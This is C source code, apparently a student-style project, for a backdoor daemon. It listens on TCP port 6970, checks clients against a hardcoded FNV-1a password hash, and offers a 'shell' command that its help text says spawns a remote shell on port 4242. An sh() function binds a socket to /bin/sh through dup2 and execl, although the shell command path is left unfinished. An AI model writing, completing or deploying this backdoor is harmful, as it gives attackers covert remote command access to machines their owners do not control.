#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdbool.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include "libft.h"

#define DEBUG printf
#define MAX_CLIENTS 3
#define PORT 6970
#define HASHED_PASSWORD 1340397520672655617UL

#define FNV_OFFSET 14695981039346656037UL
#define FNV_PRIME 1099511628211UL

#define HELP							\
"?		show help\n"					\
"shell	spawn remote shell on 4242\n"

typedef enum {
	CLI,
	PASSWORD,
	SHELL
} State;

typedef struct {
	int fd;
	bool logged;
} Client;

void add_client(Client *clients, int fd);

// Return 64-bit FNV-1a hash for a given password. See:
// https://en.wikipedia.org/wiki/Fowler–Noll–Vo_hash_function
static uint64_t fnv1a(const char* key) {
    uint64_t hash = FNV_OFFSET;
    for (const char* p = key; *p; p++) {
        hash ^= (uint64_t)(unsigned char)(*p);
        hash *= FNV_PRIME;
    }
    return hash;
}

char *clean_join(char *s1, char *s2) {
	char *tmp = ft_strjoin(s1, s2);
	free(s1);
	return tmp;
}

int init_socket(struct sockaddr_in *addr) {
	int sock = socket(PF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		DEBUG("socket does not work");
		return 0;
	}

	addr->sin_family = AF_INET;
	addr->sin_addr.s_addr = htonl(INADDR_ANY);
	addr->sin_port = htons(PORT);

	if (bind(sock, (struct sockaddr*)addr, sizeof(struct sockaddr)) < 0) {
		DEBUG("bind does not work");
		return 0;
	}

	if (listen(sock, MAX_CLIENTS) < 0) {
		DEBUG("listen does not work");
		return 0;
	}
	return sock;
}

int new_connection(
	int sock, int epollfd, struct sockaddr_in *addr, struct epoll_event *ev) {
	socklen_t len = sizeof(struct sockaddr);
	int fd = accept(sock, (struct sockaddr*)addr, &len);
	if (fd < 0) {
		DEBUG("accept does not work");
		return -1;
	}

	ev->events = EPOLLIN|EPOLLRDHUP;
	ev->data.fd = fd;
	if (epoll_ctl(epollfd, EPOLL_CTL_ADD, fd, ev) < 0) {
		DEBUG("epoll_ctl does not work");
		return -1;
	}

	DEBUG("New connection !\n");
	return fd;
}

void disconnect_client(Client *client, int epollfd, struct epoll_event *ev) {
	DEBUG("Client disconnected !\n");
	if (epoll_ctl(epollfd, EPOLL_CTL_DEL, client->fd, ev) < 0)
		DEBUG("epoll_ctl does not work");
	close(client->fd);

	client->fd = -1;
	client->logged = false;
}

char *readline(int fd) {
	char *cmd = ft_strdup("");
	char buff[BUFFER_SIZE] = {};

	while (1) {
		int ret = recv(fd, buff, BUFFER_SIZE-1, MSG_DONTWAIT);
		if (ret == 0) {
			free(cmd);
			return NULL;
		} else if (ret > 0) {
			buff[ret] = 0;
			cmd = clean_join(cmd, buff);
		} else {
			if (errno == EAGAIN || errno == EWOULDBLOCK) {
				return cmd;
			}
			free(cmd);
			return NULL;
		}
	}

	return cmd;
}

void putstr(int fd, char *s) {
	send(fd, s, ft_strlen(s), MSG_NOSIGNAL);
}

bool sh(int fd) {
	int pid = fork();

	if (!pid) {
		dup2(fd, 0);
		dup2(fd, 1);
		dup2(fd, 2);
		execl("/bin/sh", "sh", (char *) NULL);
	}

	return true;
}

void init_clients(Client *clients) {
	for (int i = 0; i < MAX_CLIENTS; i++) {
		clients[i].fd = -1;
	}
}

void add_client(Client *clients, int fd) {
	for (int i = 0; i < MAX_CLIENTS; i++) {
		if (clients[i].fd == -1) {
			clients[i].fd = fd;
			return;
		}
	}
}

Client *get_client(Client *clients, int fd) {
	for (int i = 0; i < MAX_CLIENTS; i++) {
		if (clients[i].fd == fd)
			return clients+i;
	}
	return NULL;
}

void check_password(Client *client, char *line) {
	if (fnv1a(line) == HASHED_PASSWORD) {
		client->logged = true;
	} else {
		putstr(client->fd, "Password: ");
	}
}

int main() {
	struct sockaddr_in addr = {};
	struct epoll_event ev, events[MAX_CLIENTS];
	Client clients[MAX_CLIENTS] = {};

	bool shell = false;

	init_clients(clients);
	int sock = init_socket(&addr);
	if (!sock)
		return 0;

	int epollfd = epoll_create1(0);
	if (epollfd < 0) {
		DEBUG("epoll_create1 does not work");
		return 0;
	}

	ev.events = EPOLLIN;
	ev.data.fd = sock;

	if (epoll_ctl(epollfd, EPOLL_CTL_ADD, sock, &ev)) {
		DEBUG("epoll_ctl does not work");
		return 0;
	}

	while (true) {
		int nfds = epoll_wait(epollfd, events, MAX_CLIENTS, -1);
		if (nfds == -1) {
			DEBUG("epoll_wait does not work");
			return 0;
		}

		for (int n = 0; n < nfds; n++) {
			int fd = events[n].data.fd;
			if (fd == sock) {
				int newfd = new_connection(sock, epollfd, &addr, &ev);
				add_client(clients, newfd);
				putstr(newfd, "Password: ");
			} else {
				Client *client = get_client(clients, events[n].data.fd);
				if (!client) {
					continue;
				}
				char *line = readline(client->fd);

				if (!line) {
					disconnect_client(client, epollfd, &ev);
					continue;
				}

				if (!client->logged) {
					check_password(client, line);
				} else if (!ft_strcmp(line, "shell\n")) {
					shell = true;
					disconnect_client(client, epollfd, &ev);
				} else if (!ft_strcmp(line, "?\n")) {
					putstr(client->fd, HELP);
				}
			}
		}
	}

	close(sock);
}
